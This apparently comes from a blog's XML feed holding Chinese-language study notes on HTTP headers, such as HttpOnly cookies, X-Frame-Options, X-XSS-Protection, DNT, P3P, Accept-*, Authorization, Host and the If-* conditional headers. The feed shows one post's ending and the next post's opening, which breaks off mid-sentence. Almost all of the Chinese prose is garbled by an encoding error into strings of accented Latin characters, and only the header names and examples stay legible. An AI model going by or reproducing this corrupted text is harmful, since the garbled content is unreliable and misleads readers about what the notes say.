Cookieã€‚å…¶ä¸»è¦ç›®çš„ä¸ºé˜²æ­¢è·¨ç«™è„šæœ¬æ”»å‡»ï¼ˆCross-sitescriptingï¼ŒXSSï¼‰å¯¹ Cookie çš„ä¿¡æ¯çªƒå–ã€‚å‘é€æŒ‡å®š HttpOnly å±žæ€§çš„ Cookie çš„æ–¹æ³•å¦‚ä¸‹æ‰€ç¤ºã€‚ 1Set-Cookie: name=value; HttpOnly é€šè¿‡ä¸Šè¿°è®¾ç½®ï¼Œé€šå¸¸ä»Ž Web é¡µé¢å†…è¿˜å¯ä»¥å¯¹ Cookie è¿›è¡Œè¯»å–æ“ä½œã€‚ä½†ä½¿ç”¨ JavaScript çš„document.cookie å°±æ— æ³•è¯»å–é™„åŠ  HttpOnly å±žæ€§åŽçš„ Cookie çš„å†…å®¹äº†ã€‚å› æ­¤ï¼Œä¹Ÿå°±æ— æ³•åœ¨ XSS ä¸­åˆ©ç”¨ JavaScript åŠ«æŒCookie äº†ã€‚ è™½ç„¶æ˜¯ç‹¬ç«‹çš„æ‰©å±•åŠŸèƒ½ï¼Œä½† Internet Explorer 6 SP1 ä»¥ä¸Šç‰ˆæœ¬ç­‰å½“ä¸‹çš„ä¸»æµæµè§ˆå™¨éƒ½å·²ç»æ”¯æŒè¯¥æ‰©å±•äº†ã€‚å¦å¤–é¡ºå¸¦ä¸€æï¼Œè¯¥æ‰©å±•å¹¶éžæ˜¯ä¸ºäº†é˜²æ­¢ XSS è€Œå¼€å‘çš„ã€‚ Cookie1Cookie: status=enable é¦–éƒ¨å­—æ®µ Cookie ä¼šå‘ŠçŸ¥æœåŠ¡å™¨ï¼Œå½“å®¢æˆ·ç«¯æƒ³èŽ·å¾— HTTP çŠ¶æ€ç®¡ç†æ”¯æŒæ—¶ï¼Œå°±ä¼šåœ¨è¯·æ±‚ä¸­åŒ…å«ä»ŽæœåŠ¡å™¨æŽ¥æ”¶åˆ°çš„ Cookieã€‚æŽ¥æ”¶åˆ°å¤šä¸ªCookie æ—¶ï¼ŒåŒæ ·å¯ä»¥ä»¥å¤šä¸ª Cookie å½¢å¼å‘é€ã€‚ å…¶ä»–é¦–éƒ¨å­—æ®µHTTP é¦–éƒ¨å­—æ®µæ˜¯å¯ä»¥è‡ªè¡Œæ‰©å±•çš„ã€‚æ‰€ä»¥åœ¨ Web æœåŠ¡å™¨å’Œæµè§ˆå™¨çš„åº”ç”¨ä¸Šï¼Œä¼šå‡ºçŽ°å„ç§éžæ ‡å‡†çš„é¦–éƒ¨å­—æ®µã€‚ ä¾‹å¦‚ï¼š X-Frame-Options X-XSS-Protection DNT P3P X-Frame-Optionsé¦–éƒ¨å­—æ®µ X-Frame-Options å±žäºŽ HTTP å“åº”é¦–éƒ¨ï¼Œç”¨äºŽæŽ§åˆ¶ç½‘ç«™å†…å®¹åœ¨å…¶ä»– Web ç½‘ç«™çš„ Frame æ ‡ç­¾å†…çš„æ˜¾ç¤ºé—®é¢˜ã€‚å…¶ä¸»è¦ç›®çš„æ˜¯ä¸ºäº†é˜²æ­¢ç‚¹å‡»åŠ«æŒï¼ˆclickjackingï¼‰æ”»å‡»ã€‚ é¦–éƒ¨å­—æ®µ X-Frame-Options æœ‰ä»¥ä¸‹ä¸¤ä¸ªå¯æŒ‡å®šçš„å­—æ®µå€¼ã€‚ DENY ï¼šæ‹’ç» SAMEORIGIN ï¼šä»…åŒæºåŸŸåä¸‹çš„é¡µé¢ï¼ˆTop-level-browsing-contextï¼‰åŒ¹é…æ—¶è®¸å¯ã€‚ï¼ˆæ¯”å¦‚ï¼Œå½“æŒ‡å®š http://hackr.jp/sample.htmlé¡µé¢ä¸º SAMEORIGIN æ—¶ï¼Œé‚£ä¹ˆ hackr.jp ä¸Šæ‰€æœ‰é¡µé¢çš„ frame éƒ½è¢«å…è®¸å¯åŠ è½½è¯¥é¡µé¢ï¼Œè€Œ example.com ç­‰å…¶ä»–åŸŸåçš„é¡µé¢å°±ä¸è¡Œäº†ï¼‰ æ”¯æŒè¯¥é¦–éƒ¨å­—æ®µçš„æµè§ˆå™¨æœ‰ï¼šInternet Explorer 8ã€Firefox 3.6.9+ã€Chrome 4.1.249.1042+ã€Safari 4+ å’Œ Opera 10.50+ ç­‰ã€‚çŽ°åœ¨ä¸»æµçš„æµè§ˆå™¨éƒ½å·²ç»æ”¯æŒã€‚èƒ½åœ¨æ‰€æœ‰çš„ Web æœåŠ¡å™¨ç«¯é¢„å…ˆè®¾å®šå¥½ X-Frame-Options å­—æ®µå€¼æ˜¯æœ€ç†æƒ³çš„çŠ¶æ€ã€‚ X-XSS-Protectioné¦–éƒ¨å­—æ®µ X-XSS-Protection å±žäºŽ HTTP å“åº”é¦–éƒ¨ï¼Œå®ƒæ˜¯é’ˆå¯¹è·¨ç«™è„šæœ¬æ”»å‡»ï¼ˆXSSï¼‰çš„ä¸€ç§å¯¹ç­–ï¼Œç”¨äºŽæŽ§åˆ¶æµè§ˆå™¨ XSS é˜²æŠ¤æœºåˆ¶çš„å¼€å…³ã€‚ é¦–éƒ¨å­—æ®µ X-XSS-Protection å¯æŒ‡å®šçš„å­—æ®µå€¼å¦‚ä¸‹ã€‚ 0 ï¼šå°† XSS è¿‡æ»¤è®¾ç½®æˆæ— æ•ˆçŠ¶æ€ 1 ï¼šå°† XSS è¿‡æ»¤è®¾ç½®æˆæœ‰æ•ˆçŠ¶æ€ DNT1DNT: 1 é¦–éƒ¨å­—æ®µ DNT å±žäºŽ HTTP è¯·æ±‚é¦–éƒ¨ï¼Œå…¶ä¸­ DNT æ˜¯ Do Not Track çš„ç®€ç§°ï¼Œæ„ä¸ºæ‹’ç»ä¸ªäººä¿¡æ¯è¢«æ”¶é›†ï¼Œæ˜¯è¡¨ç¤ºæ‹’ç»è¢«ç²¾å‡†å¹¿å‘Šè¿½è¸ªçš„ä¸€ç§æ–¹æ³•ã€‚ é¦–éƒ¨å­—æ®µ DNT å¯æŒ‡å®šçš„å­—æ®µå€¼å¦‚ä¸‹ã€‚ 0 ï¼šåŒæ„è¢«è¿½è¸ª 1 ï¼šæ‹’ç»è¢«è¿½è¸ª ç”±äºŽé¦–éƒ¨å­—æ®µ DNT çš„åŠŸèƒ½å…·å¤‡æœ‰æ•ˆæ€§ï¼Œæ‰€ä»¥ Web æœåŠ¡å™¨éœ€è¦å¯¹ DNTåšå¯¹åº”çš„æ”¯æŒã€‚ P3P1P3P: CP="CAO DSP LAW CURa ADMa DEVa TAIa PSAa PSDa IVAa IVDa OUR BUS é¦–éƒ¨å­—æ®µ P3P å±žäºŽ HTTP ç›¸åº”é¦–éƒ¨ï¼Œé€šè¿‡åˆ©ç”¨ P3Pï¼ˆThe Platform forPrivacy Preferencesï¼Œåœ¨çº¿éšç§åå¥½å¹³å°ï¼‰æŠ€æœ¯ï¼Œå¯ä»¥è®© Web ç½‘ç«™ä¸Šçš„ä¸ªäººéšç§å˜æˆä¸€ç§ä»…ä¾›ç¨‹åºå¯ç†è§£çš„å½¢å¼ï¼Œä»¥è¾¾åˆ°ä¿æŠ¤ç”¨æˆ·éšç§çš„ç›®çš„ã€‚ è¦è¿›è¡Œ P3P çš„è®¾å®šï¼Œéœ€æŒ‰ä»¥ä¸‹æ“ä½œæ­¥éª¤è¿›è¡Œã€‚æ­¥éª¤ 1ï¼šåˆ›å»º P3P éšç§æ­¥éª¤ 2ï¼šåˆ›å»º P3P éšç§å¯¹ç…§æ–‡ä»¶åŽï¼Œä¿å­˜å‘½ååœ¨ /w3c/p3p.xmlæ­¥éª¤ 3ï¼šä»Ž P3P éšç§ä¸­æ–°å»º Compact policies åŽï¼Œè¾“å‡ºåˆ° HTTP å“åº”ä¸­ åè®®ä¸­å¯¹ X- å‰ç¼€çš„åºŸé™¤åœ¨ HTTP ç­‰å¤šç§åè®®ä¸­ï¼Œé€šè¿‡ç»™éžæ ‡å‡†å‚æ•°åŠ ä¸Šå‰ç¼€ X-ï¼Œæ¥åŒºåˆ«äºŽæ ‡å‡†å‚æ•°ï¼Œå¹¶ä½¿é‚£äº›éžæ ‡å‡†çš„å‚æ•°ä½œä¸ºæ‰©å±•å˜æˆå¯èƒ½ã€‚ä½†æ˜¯è¿™ç§ç®€å•ç²—æš´çš„åšæ³•æœ‰ç™¾å®³è€Œæ— ä¸€ç›Šï¼Œå› æ­¤åœ¨â€œRFC 6648 - Deprecatingthe â€œX-â€œ Prefix and Similar Constructs in Application Protocolsâ€ä¸­æè®®åœæ­¢è¯¥åšæ³•ã€‚ç„¶è€Œï¼Œå¯¹å·²ç»åœ¨ä½¿ç”¨ä¸­çš„ X- å‰ç¼€æ¥è¯´ï¼Œä¸åº”è¯¥è¦æ±‚å…¶å˜æ›´ã€‚ å‚è€ƒé“¾æŽ¥ï¼šhttps://book.douban.com/subject/25863515/]]></content>
      <categories>
        <category>http</category>
      </categories>
      <tags>
        <tag>http</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[æ·±å…¥æµ…å‡ºHTTPï¼Œä»Žå¼€å§‹åˆ°æ”¾å¼ƒï¼ˆç¬¬å…­ç« ä¸­ï¼‰â€”â€” HTTP é¦–éƒ¨]]></title>
    <url>%2F2018-08-21-read-%E5%9B%BE%E8%A7%A3HTTP-Part6%E4%B8%AD.html</url>
    <content type="text"><![CDATA[å…¬å¸ä¸Šä¸ªå‘¨æœ«å‡ºåŽ»çŽ©äº†ï¼Œæ‰€ä»¥æ²¡æœ‰æ›´æ–°ï¼ŒçŽ°åœ¨åˆæœ‰é¡¹ç›®åœ¨èº«ä¸Šï¼Œæ‰€ä»¥æ›´æ–°çš„æ¯”è¾ƒæ…¢ã€‚ ç¬¬å…­ç«  HTTP é¦–éƒ¨ï¼ˆä¸­ï¼‰è¯·æ±‚é¦–éƒ¨å­—æ®µè¯·æ±‚é¦–éƒ¨å­—æ®µæ˜¯ä»Žå®¢æˆ·ç«¯å¾€æœåŠ¡å™¨ç«¯å‘é€è¯·æ±‚æŠ¥æ–‡ä¸­æ‰€ä½¿ç”¨çš„å­—æ®µï¼Œç”¨äºŽè¡¥å……è¯·æ±‚çš„é™„åŠ æ¶ˆæ¯ã€å®¢æˆ·ç«¯æ¶ˆæ¯ã€å¯¹å“åº”å†…å®¹ç›¸å…³çš„ä¼˜å…ˆçº§ç­‰å†…å®¹ã€‚ Accept 1Accept: text/html,application/xhtml+xml, application/xml;q=0.9,*/*;q=0 Accept é¦–éƒ¨å­—æ®µå¯é€šçŸ¥æœåŠ¡å™¨ï¼Œç”¨æˆ·ä»£ç†èƒ½å¤Ÿå¤„ç†çš„åª’ä½“ç±»åž‹åŠåª’ä½“ç±»åž‹çš„ç›¸å¯¹ä¼˜å…ˆçº§ã€‚å¯ä½¿ç”¨ type/subtype è¿™ç§å½¢å¼ï¼Œä¸€æ¬¡æŒ‡å®šå¤šç§åª’ä½“ç±»åž‹ã€‚ åª’ä½“ç±»åž‹ ä¾‹å­ æ–‡æœ¬æ–‡ä»¶ text/html, text/plain, text/cs..application/xhtml+xml, application/xml å›¾ç‰‡æ–‡ä»¶ image/jpeg, image/gif, image/png è§†é¢‘æ–‡ä»¶ video/mpeg, video/quicktime åº”ç”¨ç¨‹åºä½¿ç”¨çš„äºŒè¿›åˆ¶æ–‡ä»¶ application/octet-stream, application/zip æ¯”å¦‚ï¼Œå¦‚æžœæµè§ˆå™¨ä¸æ”¯æŒ PNG å›¾ç‰‡çš„æ˜¾ç¤ºï¼Œé‚£ Accept å°±ä¸æŒ‡å®š image/pngï¼Œè€ŒæŒ‡å®šå¯å¤„ç†çš„ image/gif å’Œ image/jpeg ç­‰å›¾ç‰‡ç±»åž‹ã€‚ è‹¥æƒ³è¦ç»™æ˜¾ç¤ºçš„åª’ä½“ç±»åž‹å¢žåŠ ä¼˜å…ˆçº§ï¼Œåˆ™ä½¿ç”¨ q= æ¥é¢å¤–è¡¨ç¤ºæƒé‡å€¼ï¼Œç”¨åˆ†å·ï¼ˆ;ï¼‰è¿›è¡Œåˆ†éš”ã€‚æƒé‡å€¼ q çš„èŒƒå›´æ˜¯ 0~1ï¼ˆå¯ç²¾ç¡®åˆ°å°æ•°ç‚¹åŽ 3 ä½ï¼‰ï¼Œä¸” 1 ä¸ºæœ€å¤§å€¼ã€‚ä¸æŒ‡å®šæƒé‡ q å€¼æ—¶ï¼Œé»˜è®¤æƒé‡ä¸º q=1.0ã€‚ å½“æœåŠ¡å™¨æä¾›å¤šç§å†…å®¹æ—¶ï¼Œå°†ä¼šé¦–å…ˆè¿”å›žæƒé‡å€¼æœ€é«˜çš„åª’ä½“ç±»åž‹ã€‚ Accept-Charset 1Accept-Charset: iso-8859-5, unicode-1-1;q=0.8 Accept-Charset é¦–éƒ¨å­—æ®µå¯ç”¨æ¥é€šçŸ¥æœåŠ¡å™¨ç”¨æˆ·ä»£ç†æ”¯æŒçš„å­—ç¬¦é›†åŠå­—ç¬¦é›†çš„ç›¸å¯¹ä¼˜å…ˆé¡ºåºã€‚å¦å¤–ï¼Œå¯ä¸€æ¬¡æ€§æŒ‡å®šå¤šç§å­—ç¬¦é›†ã€‚ä¸Žé¦–éƒ¨å­—æ®µ Accept ç›¸åŒçš„æ˜¯å¯ç”¨æƒé‡ q å€¼æ¥è¡¨ç¤ºç›¸å¯¹ä¼˜å…ˆçº§ã€‚ è¯¥é¦–å­—æ®µåº”ç”¨äºŽå†…å®¹åå•†æœºåˆ¶çš„æœåŠ¡å™¨é©±åŠ¨åå•†ã€‚ Accept-Encoding 1Accept-Encoding: gzip, deflate Accept-Encoding é¦–éƒ¨å­—æ®µç”¨æ¥å‘ŠçŸ¥æœåŠ¡å™¨ç”¨æˆ·ä»£ç†æ”¯æŒçš„å†…å®¹ç¼–ç åŠå†…å®¹ç¼–ç çš„ä¼˜å…ˆçº§é¡ºåºã€‚å¯ä¸€æ¬¡æ€§æŒ‡å®šå¤šç§å†…å®¹ç¼–ç ã€‚ å†…å®¹ç¼–ç çš„ä¾‹å­ å†…å®¹ç¼–ç  ä¾‹å­ gzip ç”±æ–‡ä»¶åŽ‹ç¼©ç¨‹åº gzipï¼ˆGUN zipï¼‰ç”Ÿæˆçš„ç¼–ç æ ¼å¼ï¼ˆRFC1952ï¼‰,é‡‡ç”¨ Lempel-Ziv ç®—æ³•ï¼ˆLZ77ï¼‰ä»¥åŠ 32 ä½å¾ªçŽ¯å†—ä½™æ ¡éªŒï¼ˆCyclic Redundancy Checkï¼Œé€šç§° CRCï¼‰ compress ç”± UNIX æ–‡ä»¶åŽ‹ç¼©ç¨‹åº compress ç”Ÿæˆçš„ç¼–ç æ ¼å¼ï¼Œé‡‡ç”¨ Lempel-Ziv-Welch ç®—æ³•ï¼ˆLZWï¼‰ deflate ç»„åˆä½¿ç”¨ zlib æ ¼å¼ï¼ˆRFC1950ï¼‰åŠç”± deflate åŽ‹ç¼©ç®—æ³•ï¼ˆRFC1951ï¼‰ç”Ÿæˆçš„ç¼–ç æ ¼å¼ identity ä¸æ‰§è¡ŒåŽ‹ç¼©æˆ–ä¸ä¼šå˜åŒ–çš„é»˜è®¤ç¼–ç æ ¼å¼ é‡‡ç”¨æƒé‡ q å€¼æ¥è¡¨ç¤ºç›¸å¯¹ä¼˜å…ˆçº§ï¼Œè¿™ç‚¹ä¸Žé¦–éƒ¨å­—æ®µ Accept ç›¸åŒã€‚å¦å¤–ï¼Œä¹Ÿå¯ä½¿ç”¨æ˜Ÿå·ï¼ˆ*ï¼‰ä½œä¸ºé€šé…ç¬¦ï¼ŒæŒ‡å®šä»»æ„çš„ç¼–ç æ ¼å¼ã€‚ Accept-Language1Accept-Language: zh-cn,zh;q=0.7,en-us,en;q=0.3 é¦–éƒ¨å­—æ®µ Accept-Language ç”¨æ¥å‘ŠçŸ¥æœåŠ¡å™¨ç”¨æˆ·ä»£ç†èƒ½å¤Ÿå¤„ç†çš„è‡ªç„¶è¯­è¨€é›†ï¼ˆæŒ‡ä¸­æ–‡æˆ–è‹±æ–‡ç­‰ï¼‰ï¼Œä»¥åŠè‡ªç„¶è¯­è¨€é›†çš„ç›¸å¯¹ä¼˜å…ˆçº§ã€‚å¯ä¸€æ¬¡æŒ‡å®šå¤šç§è‡ªç„¶è¯­è¨€é›†ã€‚å’Œ Accept é¦–éƒ¨å­—æ®µä¸€æ ·ï¼ŒæŒ‰æƒé‡å€¼ q æ¥è¡¨ç¤ºç›¸å¯¹ä¼˜å…ˆçº§ã€‚åœ¨ä¸Šè¿°å›¾ä¾‹ä¸­ï¼Œå®¢æˆ·ç«¯åœ¨æœåŠ¡å™¨æœ‰ä¸­æ–‡ç‰ˆèµ„æºçš„æƒ…å†µä¸‹ï¼Œä¼šè¯·æ±‚å…¶è¿”å›žä¸­æ–‡ç‰ˆå¯¹åº”çš„å“åº”ï¼Œæ²¡æœ‰ä¸­æ–‡ç‰ˆæ—¶ï¼Œåˆ™è¯·æ±‚è¿”å›žè‹±æ–‡ç‰ˆå“åº”ã€‚ Authorization 1Authorization: Basic dWVub3NlbjpwYXNzd29yZA== é¦–éƒ¨å­—æ®µ Authorization æ˜¯ç”¨æ¥å‘ŠçŸ¥æœåŠ¡å™¨ï¼Œç”¨æˆ·ä»£ç†çš„è®¤è¯ä¿¡æ¯ï¼ˆè¯ä¹¦å€¼ï¼‰ã€‚é€šå¸¸ï¼Œæƒ³è¦é€šè¿‡æœåŠ¡å™¨è®¤è¯çš„ç”¨æˆ·ä»£ç†ä¼šåœ¨æŽ¥æ”¶åˆ°è¿”å›žçš„401 çŠ¶æ€ç å“åº”åŽï¼ŒæŠŠé¦–éƒ¨å­—æ®µ Authorization åŠ å…¥è¯·æ±‚ä¸­ã€‚å…±ç”¨ç¼“å­˜åœ¨æŽ¥æ”¶åˆ°å«æœ‰ Authorization é¦–éƒ¨å­—æ®µçš„è¯·æ±‚æ—¶çš„æ“ä½œå¤„ç†ä¼šç•¥æœ‰å·®å¼‚ã€‚æœ‰å…³ HTTP è®¿é—®è®¤è¯åŠ Authorization é¦–éƒ¨å­—æ®µï¼Œç¨åŽçš„ç« èŠ‚è¿˜ä¼šè¯¦ç»†è¯´æ˜Ž Expect 1Expect: 100-continue å®¢æˆ·ç«¯ä½¿ç”¨ Expect é¦–éƒ¨å­—æ®µæ¥å‘ŠçŸ¥æœåŠ¡å™¨ï¼ŒæœŸæœ›å‡ºçŽ°çš„æŸäº›ç‰¹å®šè¡Œä¸ºã€‚å› æœåŠ¡å™¨æ— æ³•ç†è§£å®¢æˆ·ç«¯çš„æœŸæœ›åšå‡ºå›žåº”è€Œå‘ç”Ÿé”™è¯¯æ—¶ï¼Œä¼šè¿”å›žçŠ¶æ€ç  417 Expection Failed å®¢æˆ·ç«¯å¯ä»¥åˆ©ç”¨è¯¥é¦–éƒ¨å­—æ®µï¼Œå†™æ˜Žæ‰€æœŸæœ›çš„æ‰©å±•ã€‚è™½ç„¶ HTTP/1.1 è§„èŒƒåªå®šä¹‰äº† 100-continueï¼ˆçŠ¶æ€ç  100 Continue ä¹‹æ„ï¼‰ ç­‰å¾…çŠ¶æ€ç  100 å“åº”çš„å®¢æˆ·ç«¯åœ¨å‘ç”Ÿè¯·æ±‚æ—¶ï¼Œéœ€è¦æŒ‡å®š Expect:100-continueã€‚ From é¦–éƒ¨å­—æ®µ From ç”¨æ¥å‘ŠçŸ¥æœåŠ¡å™¨ä½¿ç”¨ç”¨æˆ·ä»£ç†çš„ç”¨æˆ·çš„ç”µå­é‚®ä»¶åœ°å€ã€‚é€šå¸¸ï¼Œå…¶ä½¿ç”¨ç›®çš„å°±æ˜¯ä¸ºäº†æ˜¾ç¤ºæœç´¢å¼•æ“Žç­‰ç”¨æˆ·ä»£ç†çš„è´Ÿè´£äººçš„ç”µå­é‚®ä»¶è”ç³»æ–¹å¼ã€‚ä½¿ç”¨ä»£ç†æ—¶ï¼Œåº”å°½å¯èƒ½åŒ…å« From é¦–éƒ¨å­—æ®µï¼ˆä½†å¯èƒ½ä¼šå› ä»£ç†ä¸åŒï¼Œå°†ç”µå­é‚®ä»¶åœ°å€è®°å½•åœ¨ User-Agent é¦–éƒ¨å­—æ®µå†…ï¼‰ã€‚ Host å›¾ï¼šè™šæ‹Ÿä¸»æœºè¿è¡Œåœ¨åŒä¸€ä¸ª IP ä¸Šï¼Œå› æ­¤ä½¿ç”¨é¦–éƒ¨å­—æ®µ Host åŠ ä»¥åŒºåˆ† 1Host: www.hackr.jp é¦–éƒ¨å­—æ®µ Host ä¼šå‘ŠçŸ¥æœåŠ¡å™¨ï¼Œè¯·æ±‚çš„èµ„æºæ‰€å¤„çš„äº’è”ç½‘ä¸»æœºåå’Œç«¯å£å·ã€‚Host é¦–éƒ¨å­—æ®µåœ¨ HTTP/1.1 è§„èŒƒå†…æ˜¯å”¯ä¸€ä¸€ä¸ªå¿…é¡»è¢«åŒ…å«åœ¨è¯·æ±‚å†…çš„é¦–éƒ¨å­—æ®µã€‚é¦–éƒ¨å­—æ®µ Host å’Œä»¥å•å°æœåŠ¡å™¨åˆ†é…å¤šä¸ªåŸŸåçš„è™šæ‹Ÿä¸»æœºçš„å·¥ä½œæœºåˆ¶æœ‰å¾ˆå¯†åˆ‡çš„å…³è”ï¼Œè¿™æ˜¯é¦–éƒ¨å­—æ®µ Host å¿…é¡»å­˜åœ¨çš„æ„ä¹‰ã€‚ è¯·æ±‚è¢«å‘é€è‡³æœåŠ¡å™¨æ—¶ï¼Œè¯·æ±‚ä¸­çš„ä¸»æœºåä¼šç”¨ IP åœ°å€ç›´æŽ¥æ›¿æ¢è§£å†³ã€‚ä½†å¦‚æžœè¿™æ—¶ï¼Œç›¸åŒçš„ IP åœ°å€ä¸‹éƒ¨ç½²è¿è¡Œç€å¤šä¸ªåŸŸåï¼Œé‚£ä¹ˆæœåŠ¡å™¨å°±ä¼šæ— æ³•ç†è§£ç©¶ç«Ÿæ˜¯å“ªä¸ªåŸŸåå¯¹åº”çš„è¯·æ±‚ã€‚å› æ­¤ï¼Œå°±éœ€è¦ä½¿ç”¨é¦–éƒ¨å­—æ®µ Host æ¥æ˜Žç¡®æŒ‡å‡ºè¯·æ±‚çš„ä¸»æœºåã€‚è‹¥æœåŠ¡å™¨æœªè®¾å®šä¸»æœºåï¼Œé‚£ç›´æŽ¥å‘é€ä¸€ä¸ªç©ºå€¼å³å¯ã€‚å¦‚ä¸‹æ‰€ç¤ºã€‚ 1Host: If-Match å½¢å¦‚ If-xxx è¿™ç§æ ·å¼çš„è¯·æ±‚é¦–éƒ¨å­—æ®µï¼Œéƒ½å¯ç§°ä¸ºæ¡ä»¶è¯·æ±‚ã€‚æœåŠ¡å™¨æŽ¥æ”¶åˆ°é™„å¸¦æ¡ä»¶çš„è¯·æ±‚åŽï¼Œåªæœ‰åˆ¤æ–­æŒ‡å®šæ¡ä»¶ä¸ºçœŸæ—¶ï¼Œæ‰ä¼šæ‰§è¡Œè¯·æ±‚ã€‚ å›¾ï¼šåªæœ‰å½“ If-Match çš„å­—æ®µå€¼è·Ÿ ETag å€¼åŒ¹é…ä¸€è‡´æ—¶ï¼ŒæœåŠ¡å™¨æ‰ä¼šæŽ¥å—è¯·æ±‚ 1If-Match: "123456" é¦–éƒ¨å­—æ®µ If-Matchï¼Œå±žé™„å¸¦æ¡ä»¶ä¹‹ä¸€ï¼Œå®ƒä¼šå‘ŠçŸ¥æœåŠ¡å™¨åŒ¹é…èµ„æºæ‰€ç”¨çš„å®žä½“æ ‡è®°ï¼ˆETagï¼‰å€¼ã€‚è¿™æ—¶çš„æœåŠ¡å™¨æ— æ³•ä½¿ç”¨å¼± ETag å€¼ã€‚ï¼ˆè¯·å‚ç…§æœ¬ç« æœ‰å…³é¦–éƒ¨å­—æ®µ ETag çš„è¯´æ˜Žï¼‰æœåŠ¡å™¨ä¼šæ¯”å¯¹ If-Match çš„å­—æ®µå€¼å’Œèµ„æºçš„ ETag å€¼ï¼Œä»…å½“ä¸¤è€…ä¸€è‡´æ—¶ï¼Œæ‰ä¼šæ‰§è¡Œè¯·æ±‚ã€‚åä¹‹ï¼Œåˆ™è¿”å›žçŠ¶æ€ç  412 Precondition Failed çš„å“åº”ã€‚è¿˜å¯ä»¥ä½¿ç”¨æ˜Ÿå·ï¼ˆ*ï¼‰æŒ‡å®š If-Match çš„å­—æ®µå€¼ã€‚é’ˆå¯¹è¿™ç§æƒ…å†µï¼ŒæœåŠ¡å™¨å°†ä¼šå¿½ç•¥ ETag çš„å€¼ï¼Œåªè¦èµ„æºå­˜åœ¨å°±å¤„ç†è¯·æ±‚ã€‚ If-Modified-Since å›¾ï¼šå¦‚æžœåœ¨ If-Modified-Since å­—æ®µæŒ‡å®šçš„æ—¥æœŸæ—¶é—´åŽï¼Œèµ„æºå‘ç”Ÿäº†æ›´æ–°ï¼ŒæœåŠ¡å™¨ä¼šæŽ¥å—è¯·æ±‚ 1If-Modified-Since: Thu, 15 Apr 2004 00:00:00 GMT é¦–éƒ¨å­—æ®µ If-Modified-Sinceï¼Œå±žé™„å¸¦æ¡ä»¶ä¹‹ä¸€ï¼Œå®ƒä¼šå‘ŠçŸ¥æœåŠ¡å™¨è‹¥ If-Modified-Since å­—æ®µå€¼æ—©äºŽèµ„æºçš„æ›´æ–°æ—¶é—´ï¼Œåˆ™å¸Œæœ›èƒ½å¤„ç†è¯¥è¯·æ±‚ã€‚è€Œåœ¨æŒ‡å®š If-Modified-Since å­—æ®µå€¼çš„æ—¥æœŸæ—¶é—´ä¹‹åŽï¼Œå¦‚æžœè¯·æ±‚çš„èµ„æºéƒ½æ²¡æœ‰è¿‡æ›´æ–°ï¼Œåˆ™è¿”å›žçŠ¶æ€ç  304 Not Modified çš„å“åº”ã€‚If-Modified-Since ç”¨äºŽç¡®è®¤ä»£ç†æˆ–å®¢æˆ·ç«¯æ‹¥æœ‰çš„æœ¬åœ°èµ„æºçš„æœ‰æ•ˆæ€§ã€‚èŽ·å–èµ„æºçš„æ›´æ–°æ—¥æœŸæ—¶é—´ï¼Œå¯é€šè¿‡ç¡®è®¤é¦–éƒ¨å­—æ®µ Last-Modified æ¥ç¡®å®šã€‚ If-None-Match å›¾ï¼šåªæœ‰åœ¨ If-None-Match çš„å­—æ®µå€¼ä¸Ž ETag å€¼ä¸ä¸€è‡´æ—¶ï¼Œå¯å¤„ç†è¯¥è¯·æ±‚ã€‚ä¸Ž If-Match é¦–éƒ¨å­—æ®µçš„ä½œç”¨ç›¸å é¦–éƒ¨å­—æ®µ If-None-Match å±žäºŽé™„å¸¦æ¡ä»¶ä¹‹ä¸€ã€‚å®ƒå’Œé¦–éƒ¨å­—æ®µ If-Matchä½œç”¨ç›¸åã€‚ç”¨äºŽæŒ‡å®š If-None-Match å­—æ®µå€¼çš„å®žä½“æ ‡è®°ï¼ˆETagï¼‰å€¼ä¸Žè¯·æ±‚èµ„æºçš„ ETag ä¸ä¸€è‡´æ—¶ï¼Œå®ƒå°±å‘ŠçŸ¥æœåŠ¡å™¨å¤„ç†è¯¥è¯·æ±‚ã€‚ åœ¨ GET æˆ– HEAD æ–¹æ³•ä¸­ä½¿ç”¨é¦–éƒ¨å­—æ®µ If-None-Match å¯èŽ·å–æœ€æ–°çš„èµ„æºã€‚å› æ­¤ï¼Œè¿™ä¸Žä½¿ç”¨é¦–éƒ¨å­—æ®µ If-Modified-Since æ—¶æœ‰äº›ç±»ä¼¼ã€‚ If-Range é¦–éƒ¨å­—æ®µ If-Range å±žäºŽé™„å¸¦æ¡ä»¶ä¹‹ä¸€ã€‚å®ƒå‘ŠçŸ¥æœåŠ¡å™¨è‹¥æŒ‡å®šçš„ If-Range å­—æ®µå€¼ï¼ˆETag å€¼æˆ–è€…æ—¶é—´ï¼‰å’Œè¯·æ±‚èµ„æºçš„ ETag å€¼æˆ–æ—¶é—´ç›¸ä¸€è‡´æ—¶ï¼Œåˆ™ä½œä¸ºèŒƒå›´è¯·æ±‚å¤„ç†ã€‚åä¹‹ï¼Œåˆ™è¿”å›žå…¨ä½“èµ„æºã€‚ ä¸‹é¢æˆ‘ä»¬æ€è€ƒä¸€ä¸‹ä¸ä½¿ç”¨é¦–éƒ¨å­—æ®µ If-Range å‘é€è¯·æ±‚çš„æƒ…å†µã€‚æœåŠ¡å™¨ç«¯çš„èµ„æºå¦‚æžœæ›´æ–°ï¼Œé‚£å®¢æˆ·ç«¯æŒæœ‰èµ„æºä¸­çš„ä¸€éƒ¨åˆ†ä¹Ÿä¼šéšä¹‹æ— æ•ˆï¼Œå½“ç„¶ï¼ŒèŒƒå›´è¯·æ±‚ä½œä¸ºå‰ææ˜¯æ— æ•ˆçš„ã€‚è¿™æ—¶ï¼ŒæœåŠ¡å™¨ä¼šæš‚ä¸”ä»¥çŠ¶æ€ç  412Precondition Failed ä½œä¸ºå“åº”è¿”å›žï¼Œå…¶ç›®çš„æ˜¯å‚¬ä¿ƒå®¢æˆ·ç«¯å†æ¬¡å‘é€è¯·æ±‚ã€‚è¿™æ ·ä¸€æ¥ï¼Œä¸Žä½¿ç”¨é¦–éƒ¨å­—æ®µ If-Range æ¯”èµ·æ¥ï¼Œå°±éœ€è¦èŠ±è´¹ä¸¤å€çš„åŠŸå¤«ã€‚ If-Unmodified-Since1If-Unmodified-Since: Thu, 03 Jul 2012 00:00:00 GMT é¦–éƒ¨å­—æ®µ If-Unmodified-Since å’Œé¦–éƒ¨å­—æ®µ If-Modified-Since 